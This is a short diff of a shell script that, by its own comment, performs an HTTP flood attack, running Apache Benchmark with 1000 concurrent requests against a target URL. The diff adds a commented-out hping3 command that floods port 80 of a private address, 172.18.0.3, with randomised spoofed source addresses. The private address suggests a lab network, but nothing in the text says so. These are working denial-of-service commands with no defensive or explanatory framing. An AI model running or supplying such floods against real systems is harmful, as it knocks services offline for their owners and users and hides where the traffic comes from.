@@ -11,3 +11,4 @@ CONCURRENCY=1000
 
 # Perform HTTP flood attack using Apache Benchmark
 ab -n $NUM_REQUESTS -c $CONCURRENCY $TARGET_URL
+# hping3 --rand-source --flood 172.18.0.3 -p 80
